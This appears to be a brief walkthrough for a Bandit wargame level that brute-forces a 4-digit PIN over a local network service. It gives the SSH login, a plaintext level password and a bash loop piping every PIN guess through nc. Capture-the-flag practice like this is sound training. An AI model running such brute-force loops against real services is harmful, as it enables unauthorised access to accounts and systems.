Level 24 → Level 25
Level Overview
Username: bandit24
Objective: Brute-force a 4-digit PIN over a network service

Tools Used
ssh
nc
bash

Step-by-Step Solution
Step 1: Login to the server
ssh bandit24@bandit.labs.overthewire.org -p 2220

Step 2: Create a brute-force script
for i in {0000..9999}; do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done | nc localhost 30002

Step 3: Identify correct PIN
The correct response returns the password.

Result
Successfully retrieved the password for Bandit Level 25.
